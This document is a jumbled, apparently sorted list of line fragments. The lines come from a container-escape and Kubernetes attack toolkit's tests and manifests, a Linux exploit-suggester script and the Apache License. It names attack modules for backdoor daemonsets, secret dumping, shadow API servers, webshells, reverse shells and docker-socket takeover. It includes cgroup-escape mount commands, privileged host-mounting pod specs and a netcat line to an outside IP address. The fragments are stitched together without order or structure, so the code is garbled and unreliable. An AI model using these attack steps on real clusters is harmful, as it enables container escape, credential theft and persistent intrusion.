 extracts all information from output of 'uname -a' command
 f.Name()
 f.Name() 
 fedora package listing file
 file for usage of this software.
 file not recognized - skipping
 file.Name())
 fill empty fields in ver1 with zeros
 fill empty fields in ver2 with zeros
 find CONFIG_ name (if present) for current feature (only for display purposes)
 first
 fok.(bool) {
 for --cvelist-file mode skip kernel version comparision
 for --full
 for host_path: 
 for other modes: skip if there is no such switch in sysctl
 forbidden
 from: https://stackoverflow.com/questions/4023830/how-compare-two-strings-in-dot-separated-version-format-in-bash
 gentoo: <1.10.2-r3
 get current setting of sysctl entry
 get kernel configuration in this mode
 get name (kernel or package name) and version of kernel/pkg if provided:
 getKernelConfig
 grep '.
 grep 'Desired=Unknown/Install/Remove/Purge/Hold') ]
 grep '{') ] 
 grep -E -i -o -e '-[
 grep -E -qi $IN
 grep -q 'www.exploit-db.com')
 grep -q -i '
 grep -q -i 'deb' 
 grep -q -i 'ubuntu' 
 grep aliyun-acr-credential-helper 
 grep aliyun-app-manager 
 grep alpine
 handle --kernelspacy-only 
 handles --fetch-binaries option
 handles --fetch-sources option
 handles --full filter option
 hard link == 2
 head
 head -1 
 head -1)
 help msg
 host based evaluate
 hostPath)
 http://docs.paramiko.org/en/stable/api/client.html
 https://github.com/404tk
 https://github.com/GoogleCloudPlatform/k8s-cluster-bundle/blob/master/examples/cluster/kubernetes/kube-apiserver.yaml
 https://github.com/cdk-team/CDK/wiki/Run-Test
 https://github.com/kingkaki
 https://github.com/wywwzjj
 https://github.com/yeahx
 https://www.youtube.com/watch
 hw-feature (2) 
 i < 100
 i < index
 i < len(CAPStringsList)
 i < line
 i >= 0
 i<${
 idx < len(letterBytes) {
 if kernel config IS available:
 if pkg/kernel version is not provided:
 iid == inodeID {
 in case of tag of form: 'ubuntu=16.04{kernel:4.4.0-21} remove kernel versioning part for comparision
 input data
 insert the matched exploit (with calculated Rank and highlighted tags) to arrary that will be sorted
 inside_container_cmd(
 ipExt
 ipExt <= end
 istio-check            
 k8s-backdoor-daemonset 
 k8s-configmap-dump     
 k8s-cronjob            
 k8s-get-sa-token       
 k8s-mitm-clusterip     
 k8s-psp-dump           
 k8s-secret-dump        
 k8s-shadow-apiserver   
 k8s_pod_upload()
 kernel config
 kernel version matched - bold highlight
 kernel.unprivileged_bpf_disabled != 1
 kubelet-exec           
 launch checksec mode
 len(args) != 2 {
 len(args) != 4 {
 len(fields) > 3 {
 len(opt.TlsConfig.Certificates) == 0 
 len(os.Args) == 1 {
 len(port) == 0 {
 letterIdxMask)
 linux
 linux-exploit-suggester.sh comes with ABSOLUTELY NO WARRANTY.
 local source-code dir to run 
 loop thru all availability reqs one by one 
 loop thru all enablement reqs one by one 
 loop thru all reqs one by one 
 lxcfs-rw               
 mageia package listing file
 make sure bind system:default:default to cluster-admin first (test/k8s_exploit_yaml/default_to_admin.yaml)
 mkdir -p /tmp/cgrp/cdk
 modes: kernel-feature (1) 
 mount -t cgroup -o memory cgroup /tmp/cgrp 
 mount-cgroup           
 mount-disk             
 mount-procfs           
 mounted to 
 mounted to container 
 nc $RHOST $RPORT
 nc ${RHOST} ${RPORT}
 nc 39.104.80.49 999
 neargle
 normal api-server.yaml
 of letter indices fitting in 63 bits
 ok {
 opt.TlsConfig.RootCAs == nil {
 opts.Api
 or 
 os.ModeCharDevice) == 0 {
 os.ModeSetuid != 0 {
 out 
 packages listing not available
 pacman package listing file
 params[1]
 parentID = fields[1]
 parse command line parameters
 parsed data for current OS
 path != rootDeviceAllow {
 port
 port <= p.To
 print('done')
 print('invoke UnexpectedExit')
 print(e)
 process tags and highlight those that match current OS (only for deb
 r != nil {
 randKey
 redhat package listing file
 registry-brute         
 resp)
 result.stderr
 result.stderr:
 return
 return 0
 return 2
 return result
 reverse-shell          
 rewrite-cgroup-devices 
 root %s
 run: check-ptrace
 run: cronjob
 run: docker-api-pwn
 run: istio-check
 run: k8s-backdoor-daemonset
 run: k8s-mitm-clusterip
 run: k8s-shadow-apiserver
 run: rewrite-cgroup-devices
 runc-pwn               
 s == nil {
 security related HW/kernel features
 sed '/
 sed 's/
 sed 's/:amd64//g')
 sed 's/D3L1m/
 sed 's/[
 sed 's/p[0-9]//g')
 sed -e '/
 sed -e ':a' -e 'N' -e '$!ba' -e 's/
 service-probe          
 shadow api-server changing
 shellPayload
 shim-pwn               
 skip (if run with --skip-pkg-versions) version checking if package with given name is installed
 skip DoS by default
 skip if check is not applicable (-k or --uname or -p modes) or if user said so (--skip-more-checks)
 skip if check is not applicable (-k or --uname or -p set) or if user said so (--skip-more-checks)
 sock}
 sort exploits based on calculated Rank
 special case for --checksec mode: return 2 if there is no such switch in sysctl
 special case: sysctl entry is not present on given system: signal it as: N/A
 split line with availability requirements 
 split line with enablement requirements 
 split line with requirements 
 start analysis
 stderr:
 strings.ToLower(util.RandString(6))
 success
 success dump
 sys != nil {
 syscall in linux
 take package listing from provided file 
 tar -zcvf {}_release.tar.gz cdk_
 taskRandString
 taskRandString)
 tell you to do that.
 temporary array for purpose of sorting exploits (based on exploits' rank)
 test
 test evaluate in selfbuild k8s
 test_auto_pwn()
 test_container()
 test_pod()
 that the S_ISUID and S_ISGID bits are
 that the effective group ID (or one of the
 then
 this switch is not applicable in this mode
 time.Millisecond
 time.Second)
 to - from
 to enable all.
 to escape container!
 to start the attack.
 tokens[field]
 tool: dcurl
 tool: ifconfig
 tool: kcurl
 tool: nc
 tool: probe
 tool: ps
 tool: ucurl
 tool: vi
 tr -d ' ()/')
 tr -d '[' 
 tr -d '}' 
 ubuntu/debian package listing file
 under the terms of the GNU General Public License. See LICENSE
 unix.CLONE_NEWNS 
 upload
 upload cdk to master node via ssh
 upload cdk to target pod then check command output using kubectl
 usage: ./cdk run docker-sock-deploy <sock_path> <shell_cmd> example: ./cdk run docker-sock-pwn /var/run/docker.sock 
 util.IsDir(currentPath) {
 util.IsDirectory(mi.MountPoint) {
 util.RandString(7)
 value 
 verify if package is present 
 versioning:
 we're in '--uname' mode OR (for normal mode) if there is distro version match
 webshell-deploy        
 why match those mount points
 within the Source form or
 you can keep it unchanged
 your remote server for test
!/bin/bash
!/bin/bash 
!/bin/sh
!/bin/sh' > /cmd
![png](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)
![png](https://user-images.githubusercontent.com/7868679/177925206-8d83dc95-0f2f-4d61-9a45-0d43b1b0468f.png)
"                                                               K8S.REMOTE_POD_PATH, cmd)"
"                                ""containerPort"": ${port},"
"                                ""name"": ""tcp"""
"                            ""CAP_AUDIT_CONTROL"","
"                            ""CAP_AUDIT_READ"","
"                            ""CAP_AUDIT_WRITE"","
"                            ""CAP_BLOCK_SUSPEND"","
"                            ""CAP_BPF"","
"                            ""CAP_CHECKPOINT_RESTORE"""
"                            ""CAP_CHOWN"","
"                            ""CAP_DAC_OVERRIDE"","
"                            ""CAP_DAC_READ_SEARCH"","
"                            ""CAP_FOWNER"","
"                            ""CAP_FSETID"","
"                            ""CAP_IPC_LOCK"","
"                            ""CAP_IPC_OWNER"","
"                            ""CAP_KILL"","
"                            ""CAP_LEASE"","
"                            ""CAP_LINUX_IMMUTABLE"","
"                            ""CAP_MAC_ADMIN"","
"                            ""CAP_MAC_OVERRIDE"","
"                            ""CAP_MKNOD"","
"                            ""CAP_NET_ADMIN"","
"                            ""CAP_NET_BIND_SERVICE"","
"                            ""CAP_NET_BROADCAST"","
"                            ""CAP_NET_RAW"","
"                            ""CAP_PERFMON"","
"                            ""CAP_SETFCAP"","
"                            ""CAP_SETGID"","
"                            ""CAP_SETPCAP"","
"                            ""CAP_SETUID"","
"                            ""CAP_SYSLOG"","
"                            ""CAP_SYS_ADMIN"","
"                            ""CAP_SYS_BOOT"","
"                            ""CAP_SYS_CHROOT"","
"                            ""CAP_SYS_MODULE"","
"                            ""CAP_SYS_NICE"","
"                            ""CAP_SYS_PACCT"","
"                            ""CAP_SYS_PTRACE"","
"                            ""CAP_SYS_RAWIO"","
"                            ""CAP_SYS_RESOURCE"","
"                            ""CAP_SYS_TIME"","
"                            ""CAP_SYS_TTY_CONFIG"","
"                            ""CAP_WAKE_ALARM"","
"                            TAG=""${yellow}[ ${TAG} ]${txtrst}"""
"                            [ ""$opt_uname_string"" == ""false"" ] "
"                           Version 2.0, January 2004"
"                        ""add"": ["
"                        ""image"": ""${image}"","
"                        ""mountPath"": ""/host/dev"","
"                        ""mountPath"": ""/host/etc"","
"                        ""mountPath"": ""/host/proc"","
"                        ""mountPath"": ""/host/sys"","
"                        ""mountPath"": ""/host_root"","
"                        ""name"": ""dev"""
"                        ""name"": ""etc"""
"                        ""name"": ""mitm-payload-deploy"","
"                        ""name"": ""proc"""
"                        ""name"": ""rootfs"""
"                        ""name"": ""sys"""
"                        ""ports"": ["
"                        TAG=""${lightyellow}[ $tag_distro=$tag_distro_num ]${txtrst}{$tag_pkg:$tag_pkg_num}"""
"                        [ ""$opt_uname_string"" == ""false"" ] "
"                        if [ $(echo ""$KERNEL_ALL"" "
"                    ""-c"","
"                    ""/bin/sh"","
"                    ""app"": ""mitm-payload-deploy"""
"                    ""capabilities"": {"
"                    ""name"": ""net.ipv4.ip_local_port_range"","
"                    ""name"": ""net.ipv4.tcp_fin_timeout"","
"                    ""path"": ""/"""
"                    ""path"": ""/dev"""
"                    ""path"": ""/etc"""
"                    ""path"": ""/proc"""
"                    ""path"": ""/sys"""
"                    ""privileged"": true,"
"                    ""runAsUser"": 0"
"                    ""sleep 1"""
"                    ""value"": ""10000 61000"""
"                    ""value"": ""30"""
"                    [ ""$opt_uname_string"" == ""false"" ] "
"                    [ $(echo ""$tag_distro_num_all"" "
"                    elif [ -n ""$tag_pkg_num"" -a ""$tag_pkg"" = ""kernel"" ]"
"                    elif [ -n ""$tag_pkg_num"" -a -n ""$tag_pkg""  ]"
"                    if [ -z ""$tag_pkg_num"" ]"
"                    tag_pkg=$(echo ""$tag_distro_num_all"" "
"                    tag_pkg_num="""""
"                    },"
"                ""app"": ""mitm-payload-deploy"""
"                ""args"": [""bash"", ""-c"", ""$SHELLCMD$""],"
"                ""command"": ["
"                ""containers"": ["
"                ""env"":  [""PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin""]"
"                ""hostPath"": {"
"                ""image"": ""alpine"","
"                ""labels"": {"
"                ""name"": ""dev"""
"                ""name"": ""etc"""
"                ""name"": ""nearcontainer"","
"                ""name"": ""proc"""
"                ""name"": ""rootfs"""
"                ""name"": ""sys"""
"                ""name"": ""tcp"","
"                ""path"": ""/bin/bash"","
"                ""port"": ${port},"
"                ""securityContext"": {"
"                ""targetPort"": ${port}"
"                ""volumeMounts"": ["
"                ],"
"                exitWithErrMsg ""Unknown option '$1'. Aborting."""
"                if [ ""$opt_uname_string"" == ""true"" -o "
"                output_err('ECS', cmd_parsed, pattern, 'black')"
"                output_err('ECS', cmd_parsed, pattern, 'white')"
"                output_err('Selfbuild K8s Master Node', cmd_parsed, pattern, 'black')"
"                output_err('Selfbuild K8s Master Node', cmd_parsed, pattern, 'white')"
"                output_err(image, cmd_parsed, pattern, 'black')"
"                output_err(image, cmd_parsed, pattern, 'white')"
"                tag_distro=$(echo ""$TAG"" "
"                tag_distro_num=""${tag_distro_num_all%{"
"                tag_distro_num_all=$(echo ""$TAG"" "
"                tags=""${tags}${TAG},"""
"                },"
"            ""${ip}"""
"            ""app"": ""mitm-payload-deploy"""
"            ""fsGroup"": 10001,"
"            ""matchLabels"": {"
"            ""metadata"": {"
"            ""runAsGroup"": 3000,"
"            ""runAsUser"": 1000,"
"            ""spec"": {"
"            ""supplementalGroups"": ["
"            ""sysctls"": ["
"            CVELIST_FILE=""$1"""
"            IFS=',' read -r -a tags_array <<< ""$TAGS"""
"            KERNEL=""$1"""
"            OS=""RHEL"""
"            OS=""arch"""
"            OS=""debian"""
"            OS=""fedora"""
"            OS=""mageia"""
"            PKGLIST_FILE=""$1"""
"            PKG_LIST="""""
"            PKG_LIST=$(cat ""$pkglist_file"" "
"            PKG_LIST=$(cat ""$pkglist_file"")"
"            UNAME_A=""$1"""
"            [ ! $(cat ""$CVELIST_FILE"" "
"            [ ""$(echo ""${tags_array[@]}"" "
"            [ ""$(grep ubuntu ""$pkglist_file"")"" ] "
"            [ ""$opt_cvelist_file"" = ""true"" ] "
"            [ ""$opt_skip_pkg_versions"" = ""true"" -a -n ""$pkg"" ] "
"            [ -f ""${name}_$(basename $i)"" ] "
"            [ -n ""$EXPLOIT_DB"" ] "
"            [ -n ""$author"" ] "
"            [ -n ""$reqs"" ] "
"            [ -n ""$tags"" ] "
"            ],"
"            author=$(echo ""$EXP"" "
"            cmdStdout=$(checkRequirement ""$REQ"")"
"            cve=$(echo ""$NAME"" "
"            disabled=""[   ${txtgray}N/A${txtrst}    ]"""
"            enabled=""[ ${txtgrn}Enabled${txtrst}   ]"""
"            exitWithErrMsg ""Wrong sysctl condition. There is syntax error in your features DB. Aborting."""
"            for TAG in ""${tags_array[@]}"""
"            if [ ""$"
"            output_err('K8s Pod', cmd_parsed, pattern, 'black')"
"            output_err('K8s Pod', cmd_parsed, pattern, 'white')"
"            pkg=$(echo ""$PKG_LIST"" "
"            pkgVersion=$(echo ""$pkg"" "
"            sign=""!="""
"            sign=""=="""
"            state=""[ ${txtgrn}Set to $cmdStdout${txtrst} ]"""
"            state=""[ ${txtred}Set to $cmdStdout${txtrst} ]"""
"            tags=""$TAGS"""
"            wget -q -k ""$i"" -O ""${name}_$(basename $i)"""
"            },"
"           disabled=""[ ${txtgrn}Locked${txtrst}   ]"""
"           enabled=""[ ${txtred}Exposed${txtrst}  ]"""
"          ""access"": ""rwm"""
"          ""allow"": false,"
"          attribution notices from the Source form of the Work,"
"          distribution, then any Derivative Works that You distribute must"
"          documentation, if provided along with the Derivative Works"
"          notices within Derivative Works that You distribute, alongside"
"          or as an addendum to the NOTICE text from the Work, provided"
"          pertain to any part of the Derivative Works, in at least one"
"          that You distribute, all copyright, patent, trademark, and"
"          within a display generated by the Derivative Works, if and"
"          within such NOTICE file, excluding those notices that do not"
"        ""containers"": ["
"        ""disableOOMKiller"": false"
"        ""externalIPs"": ["
"        ""hostIPC"": true,"
"        ""hostNetwork"": true,"
"        ""hostPID"": true,"
"        ""name"": ""cdk-fuzz-psp"""
"        ""name"": ""mitm-externalip"""
"        ""name"": ""mitm-payload-deploy"""
"        ""ports"": ["
"        ""prestart"": ["
"        ""replicas"": 1,"
"        ""securityContext"": {"
"        ""selector"": {"
"        ""shares"": 0"
"        ""template"": {"
"        ""type"": ""ClusterIP"""
"        ""type"": ""ipc"""
"        ""type"": ""mount"""
"        ""type"": ""network"""
"        ""type"": ""uts"""
"        ""volumes"": ["
"        ""weight"": 0"
"        '/.dockerenv',"
"        '/containerd-shim/',"
"        '/kubernetes.io/serviceaccount/token',"
"        '/root/.bashrc',"
"        '00000000a80425fb',"
"        'Cloud Provider Metadata API',"
"        'Commands and Capabilities',"
"        'Filesystem:ext4',"
"        'K8s API Server',"
"        'K8s Service Account',"
"        'Possible Privileged Container',"
"        'Sensitive Files',"
"        'Services',"
"        'System Info',"
"        'api-server allows anonymous request',"
"        'available commands',"
"        'curl,wget,nc',"
"        'current dir: /',"
"        'current dir: /root',"
"        'current user: root',"
"        'evaluate',"
"        'failed to dial Azure API',"
"        'failed to dial Google Cloud API',"
"        'find,ps',"
"        'host unix-socket found',"
"        'http://100.100.100.200/latest/meta-data/',"
"        'kcurl anonymous get https://172.21.0.1:443/api/v1/nodes',  "
"        'kcurl default get https://172.21.0.1:443/api/v1/nodes',  "
"        'kcurl',"
"        'kubectl delete cronjob cdk-backdoor-cronjob -n kube-system',"
"        'kubectl delete deployment mitm-payload-deploy',"
"        'kubectl delete pod kube-apiserver-10.206.0.11-shadow -n kube-system',"
"        'kubectl delete service mitm-externalip',"
"        'kubectl exec myappnew -- curl 10.206.0.11:9443',  "
"        'net namespace isolated',"
"        'run istio-check',"
"        'run k8s-backdoor-daemonset 1',  "
"        'run k8s-backdoor-daemonset default ubuntu whoami',  "
"        'run k8s-configmap-dump /tmp/jkdhahdjfka2',"
"        'run k8s-configmap-dump auto',"
"        'run k8s-configmap-dump',"
"        'run k8s-cronjob default min alpine ""echo helloworld""',"
"        'run k8s-mitm-clusterip default ubuntu 9.9.9.9 99',  "
"        'run k8s-secret-dump auto',"
"        'run k8s-secret-dump',"
"        'run k8s-shadow-apiserver anonymous',  "
"        'run k8s-shadow-apiserver default',  "
"        'run webshell-deploy js1p /tmp/1.jsp',"
"        'run webshell-deploy jsp /tmp/1.jsp',"
"        'run webshell-deploy php /var/www/html212/1.php',"
"        'run webshell-deploy php',"
"        'sensitive env found',"
"        'service found in process',"
"        'service-account is available',"
"        'system:anonymous',"
"        'system:serviceaccount:default',"
"        ARCH="""""
"        CDK.REMOTE_CONTAINER_PATH,"
"        CDK.REMOTE_HOST_PATH,"
"        EXP=$(echo ""$EXP"" "
"        IFS=',' read -r -a array <<< ""$ENABLE"""
"        KCONFIG="""""
"        KCONFIG=""cat ${KBUILD_OUTPUT:-/usr/src/linux}/.config"""
"        KCONFIG=""cat /boot/config-"
"        KCONFIG=""zcat /proc/config.gz"""
"        KERNEL="""""
"        PKG_LIST="""""
"        SELFBUILD_K8S.REMOTE_POD_PATH,"
"        SELFBUILD_K8S.TARGET_POD,"
"        [ ""$opt_skip_more_checks"" = ""false"" ] "
"        [ ""$opt_skip_more_checks"" = ""true"" ] "
"        [ ""$val"" != ""$curVal"" ] "
"        [ ""$val"" == ""$curVal"" ] "
"        [ $currentRelation == ""<"" ] "
"        [ $currentRelation == ""="" ] "
"        [ $currentRelation == "">"" ] "
"        [ ${pkgName} == ""linux-kernel"" ] "
"        [ -f ""${name}_$(basename $src_url)"" ] "
"        [ -n ""$OS"" -a ""$opt_skip_more_checks"" = ""false"" ] "
"        [ -n ""$comments"" ] "
"        [ -n ""$ext_url"" ] "
"        [ -n ""$tags"" ] "
"        [ -z ""$UNAME_A"" ] "
"        [ -z ""$curVal"" -a ""$opt_checksec_mode"" = ""true"" ] "
"        [ -z ""$curVal"" ] "
"        ['/api/v1'],"
"        ['00000000a80425fb', 'Discovery - K8s API Server', 'the service-account have a high authority'],"
"        ['Pulling', 'starting', 'finished'],"
"        ['apiVersion', 'api-server response'],"
"        ['apiVersion', 'nodes is forbidden'],"
"        ['apiVersion'],"
"        ['cdk-backdoor-daemonset'],"
"        ['forbidden this request'],"
"        ['generate cronjob with', 'selfLink'],"
"        ['i@cdxy.me', 'cdk evaluate', '%s', 'input args'],"
"        ['i@cdxy.me', 'cdk evaluate'],"
"        ['input args', 'i@cdxy.me', 'cdk evaluate'],"
"        ['input args'],"
"        ['invalid'],"
"        ['listening insecure-port: 0.0.0.0:9443', 'panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],"
"        ['listening insecure-port: 0.0.0.0:9443'],"
"        ['no such file or directory', 'failed'],"
"        ['no such file or directory'],"
"        ['panic:', 'cdk evaluate', 'empty'],"
"        ['panic:', 'cdk evaluate'],"
"        ['panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],"
"        ['selfLink'],"
"        ['success', 'k8s_configmaps.json'],"
"        ['success', 'k8s_secrets.json'],"
"        ['the shell is not in a istio'],"
"        ['to K8s api-server'],  "
"        ['webshell saved in'],"
"        [],"
"        ],"
"        arr[i]=""$line"""
"        binary.LittleEndian.PutUint32(ipd32, d32)"
"        black_list=['Options:', 'i@cdxy.me'],"
"        black_list=['i@cdxy.me', 'OCI '],"
"        black_list=['i@cdxy.me', 'exploit failed', 'Invalid'],"
"        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit failed'],"
"        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],"
"        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'failed'],"
"        black_list=['i@cdxy.me', 'exploit failed', 'OCI '],"
"        black_list=['i@cdxy.me', 'exploit success'],"
"        black_list=['i@cdxy.me', 'failed'],"
"        black_list=['i@cdxy.me', 'input args'],"
"        black_list=['i@cdxy.me', 'success'],"
"        black_list=['i@cdxy.me'],"
"        black_list=[],"
"        cmd=""${IN:4}"""
"        cmd='',"
"        cmd='--help',"
"        cmd='-v',"
"        cmd='evaluate --full',"
"        cmd='ifconfig',"
"        cmd='nc',"
"        cmd='probe 1.1.1.1 22 10 1000',"
"        cmd='probe 1.1.1.1 22 50-999999 1000',"
"        cmd='probe',"
"        cmd='ps',"
"        cmd='run --list',"
"        cmd='run check-ptrace',"
"        cmd='vi',"
"        cmd=r'run ak-leakage /tmp',  "
"        cmd=r'run ak-leakage',  "
"        cmd=r'run docker-sock-check /var/run/docker.sock',  "
"        cmd=r'run docker-sock-check',  "
"        cmd=r'run docker-sock-pwn /var/run/docker.sock ""touch /tmp/docker-sock-pwn""',  "
"        cmd=r'run docker-sock-pwn',  "
"        cmd=r'run mount-cgroup',  "
"        cmd=r'run mount-disk',  "
"        cmd=r'run mount-procfs',  "
"        cmd=r'run reverse-shell',  "
"        cmd=r'run rewrite-cgroup-devices',  "
"        cmd=r'run service-probe 127.0.0.1',  "
"        cmd=r'run service-probe',  "
"        cmd=r'ucurl',"
"        conn.put(CDK.BIN_PATH, CDK.REMOTE_HOST_PATH)"
"        conn.put(CDK.BIN_PATH, SELFBUILD_K8S.REMOTE_HOST_PATH)"
"        d, _ := strconv.ParseInt(gatewayHex, 0, 64)"
"        details=""$analysis_url"""
"        details=""$src_url"""
"        details=""https://www.exploit-db.com/exploits/$EXPLOIT_DB/"""
"        docker_args,"
"        docker_args='',"
"        docker_args='--cap-add=SYS_PTRACE',"
"        docker_args='--net=host',"
"        docker_args='--privileged=true',"
"        docker_args='-v /proc:/host_proc',"
"        docker_args='-v /tmp/ak-leakage:/tmp/ak-leakage',"
"        docker_args='-v /var/run/docker.sock:/var/run/docker.sock',"
"        echo ""highly probable"""
"        echo ""less probable"""
"        echo ""probable"""
"        echo -e ""   Download URL: $src_url"""
"        echo -e ""   Exposure: $(displayExposure $RANK)"""
"        echo -e ""${bldwht}${NAME}${txtrst}"""
"        elif [ ""$(grep -E '"
"        entry=$(echo ""$sysctlCondition"" "
"        exploits_to_sort[j]=""${RANK}Name: ${NAME}D3L1mReqs: ${REQS}D3L1mTags: ${tags}D3L1m$(echo ""$EXP"" "
"        for REQ in ""${array[@]}"""
"        for i in $(echo ""$EXP"" "
"        gatewayHex := ""0x"" "
"        getPkgList """" ""$PKGLIST_FILE"""
"        getPkgList ""$OS"" """""
"        if (checkRequirement ""$REQ"" ""${array[0]}"")"
"        if (checkRequirement ""$REQ"")"
"        if [ ""$opt_cvelist_file"" = ""true"" ]"
"        if [ ""$opt_full"" = ""true"" ]"
"        if [ ""$pkgName"" == ""linux-kernel"" -o ""$opt_checksec_mode"" == ""true"" ]"
"        if [ $(head -1 ""$pkglist_file"" "
"        if [ -n ""$KCONFIG"" ]"
"        if [ -n ""$TAGS"" -a -n ""$OS"" ]"
"        if [ -n ""$pkg"" ]"
"        if eval ""${cmd}"""
"        image,"
"        image='alpine:latest',"
"        image='ubuntu:latest',"
"        ipd32 := make(net.IP, 4)"
"        parseUname ""$UNAME_A"""
"        pkg=$(echo ""$PKG_LIST"" "
"        r'/root/cdk-fabric run docker-api-pwn http://127.0.0.1:2375 ""touch /host/tmp/docker-api-pwn""',"
"        raise Exception(""Upload cdk binary to K8s failed."
"        raise Exception(""Upload cdk binary to self-build k8s failed."
"        rest=""${IN"
"        result = conn.run(cmd_parsed, hide=bool(1 - verbose))"
"        return """", err"
"        return ip, nil"
"        sysctlCondition=""${IN:7}"""
"        tags="""""
"        tokens := strings.Split(scanner.Text(), sep)"
"        val=$(echo ""$sysctlCondition"" "
"        value: ""10000 61000"""
"        value: ""192.168.0.150"""
"        value: ""30"""
"        value: ""6443"""
"        version=""${IN//["
"        wget -q -k ""$src_url"" -O ""${name}_$(basename $src_url)"" "
"        white_list=['AKIA99999999999999AB'],"
"        white_list=['Containers'],"
"        white_list=['Invalid IP Range'],"
"        white_list=['SYS_PTRACE capability was disabled'],"
"        white_list=['SYS_PTRACE capability was enabled', 'root'],"
"        white_list=['Usage'],"
"        white_list=['all exploits are finished, auto exploit success!'],"
"        white_list=['cdk '],"
"        white_list=['cdk_mknod_result', 'debugfs'],"
"        white_list=['containerd-shim', 'exploit success'],"
"        white_list=['failed', 'target container is not privileged'],"
"        white_list=['finished with output'],"
"        white_list=['i@cdxy.me'],"
"        white_list=['input arg'],"
"        white_list=['input args'],"
"        white_list=['invalid input args'],"
"        white_list=['lo', '127.0'],"
"        white_list=['no such file or directory'],"
"        white_list=['options'],"
"        white_list=['root', '/usr/bin', '1'],"
"        white_list=['scanning'],"
"        white_list=['shell script saved to', 'Execute Shell', 'failed'],"
"        white_list=['success', 'core dumped'],"
"        white_list=['success', 'happy escaping', 'alpine:latest', '""ID""', 'starting container:', 'finished'],"
"        white_list=['success', 'happy escaping'],"
"        white_list=['success', 'was mounted to'],"
"        white_list=['test-poc'],"
"        white_list=white_list,"
"        },"
"      ""/bin/bash"""
"      ""Contribution"" shall mean any work of authorship, including"
"      ""Contributor"" shall mean Licensor and any individual or Legal Entity"
"      ""Derivative Works"" shall mean any work, whether in Source or Object"
"      ""HOSTNAME=b6cee9b57f3b"","
"      ""Legal Entity"" shall mean the union of the acting entity and all"
"      ""License"" shall mean the terms and conditions for use, reproduction,"
"      ""Licensor"" shall mean the copyright owner or entity authorized by"
"      ""Object"" form shall mean any form resulting from mechanical"
"      ""PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"","
"      ""Source"" form shall mean the preferred form for making modifications,"
"      ""TERM=xterm"""
"      ""Work"" shall mean the work of authorship, whether in Source or"
"      ""You"" (or ""Your"") shall mean an individual or Legal Entity"
"      ""blockIO"": {"
"      ""control"" means (i) the power, direct or indirect, to cause the"
"      ""cpu"": {"
"      ""devices"": ["
"      ""gid"": 0"
"      ""memory"": {"
"      ""uid"": 0,"
"      (c) You must retain, in the Source form of any Derivative Works"
"      (d) If the Work includes a ""NOTICE"" text file as part of its"
"      (except as stated in this section) patent license to make, have made,"
"      Contributor provides its Contributions) on an ""AS IS"" BASIS,"
"      License. However, in accepting such obligations, You may act only"
"      Licensor for the purpose of discussing and improving the Work, but"
"      Notwithstanding the above, nothing herein shall supersede or modify"
"      Object form, made available under the License, as indicated by a"
"      To apply the Apache License to your work, attach the following"
"      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or"
"      Work (including but not limited to damages for loss of goodwill,"
"      Work or Derivative Works thereof in any medium, with or without"
"      ],"
"      agreed to in writing, Licensor provides the Work (and each"
"      and charge a fee for, acceptance of support, warranty, indemnity,"
"      and issue tracking systems that are managed by, or on behalf of, the"
"      args: [""while true"
"      boilerplate notice, with the fields enclosed by brackets ""[]"""
"      command: [""/bin/bash"", ""-c"", ""--""]"
"      communication on electronic mailing lists, source code control systems,"
"      control with that entity. For the purposes of this definition,"
"      copyright license to reproduce, prepare Derivative Works of,"
"      defend, and hold each Contributor harmless for any liability"
"      designated in writing by the copyright owner as ""Not a Contribution."""
"      direction or management of such entity, whether by contract or"
"      editorial revisions, annotations, elaborations, or other modifications"
"      for any such Derivative Works as a whole, provided Your use,"
"      for use, reproduction, or distribution of Your modifications, or"
"      form, that is based on (or derived from) the Work and for which the"
"      implied, including, without limitation, any warranties or conditions"
"      incidental, or consequential damages of any character arising as a"
"      including but not limited to software source code, documentation"
"      incurred by, or claims asserted against, such Contributor by reason"
"      liable to You for damages, including any direct, indirect, special,"
"      means any form of electronic, verbal, or written communication sent"
"      modifications, and in Source or Object form, provided that You"
"      names, trademarks, service marks, or product names of the Licensor,"
"      negligent acts) or agreed to in writing, shall any Contributor be"
"      not limited to compiled object code, generated documentation,"
"      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A"
"      of any other Contributor, and only if You agree to indemnify,"
"      of this License, Derivative Works shall not include works that remain"
"      on Your own behalf and on Your sole responsibility, not on behalf"
"      or contributory patent infringement, then any patent licenses"
"      other commercial damages or losses), even if such Contributor"
"      other entities that control, are controlled by, or are under common"
"      otherwise, or (ii) ownership of fifty percent (50%) or more of the"
"      outstanding shares, or (iii) beneficial ownership of such entity."
"      publicly display, publicly perform, sublicense, and distribute the"
"      represent, as a whole, an original work of authorship. For the purposes"
"      reproduction, and distribution of the Work otherwise complies with"
"      same ""printed page"" as the copyright notice for easier"
"      separable from, or merely link (or bind by name) to the interfaces of,"
"      source, and configuration files."
"      the Work or Derivative Works thereof, You may choose to offer,"
"      the copyright owner. For the purposes of this definition, ""submitted"""
"      this License, each Contributor hereby grants to You a perpetual,"
"      this License, without any additional terms or conditions."
"      to that Work or Derivative Works thereof, that is intentionally"
"      to the Licensor or its representatives, including but not limited to"
"      transformation or translation of a Source form, including but"
"      use, offer to sell, sell, import, and otherwise transfer the Work,"
"      whether in tort (including negligence), contract, or otherwise,"
"      work stoppage, computer failure or malfunction, or any and all"
"      worldwide, non-exclusive, no-charge, royalty-free, irrevocable"
"      },"
"     cmd = 'evaluate --full',"
"     docker_args = '--net=host',"
"     image = 'centos:latest',"
"     white_list = white_list,"
"    ""apiVersion"": ""apps/v1"","
"    ""apiVersion"": ""v1"","
"    ""args"": ["
"    ""cwd"": ""/"""
"    ""env"": ["
"    ""kind"": ""Deployment"","
"    ""kind"": ""Pod"","
"    ""kind"": ""Service"","
"    ""metadata"": {"
"    ""namespaces"": ["
"    ""resources"": {"
"    ""spec"": {"
"    ""terminal"": false,"
"    ""user"": {"
"    ARCH="""""
"    ARCH=$(echo ""$uname"" "
"    AVAILABLE=""${arr[1]}"" "
"    ENABLE=$(echo ""$FEATURE"" "
"    IFS=',' read -r -a array <<< ""$AVAILABLE"""
